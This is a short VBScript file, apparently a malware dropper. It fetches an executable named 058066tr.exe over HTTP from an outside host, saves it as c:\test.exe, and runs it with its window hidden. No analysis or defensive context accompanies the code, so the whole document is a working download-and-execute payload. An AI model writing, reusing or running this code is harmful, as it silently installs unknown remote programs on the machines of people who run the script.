Dim BinaryData
Dim xml
Set xml = CreateObject("Microsoft.XMLHTTP")
xml.Open "GET", "http://www.yeterli.com/indir/058066tr.exe", False 
xml.Send
BinaryData = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write BinaryData
BinaryStream.SaveToFile "c:\test.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\test.exe", 0, false
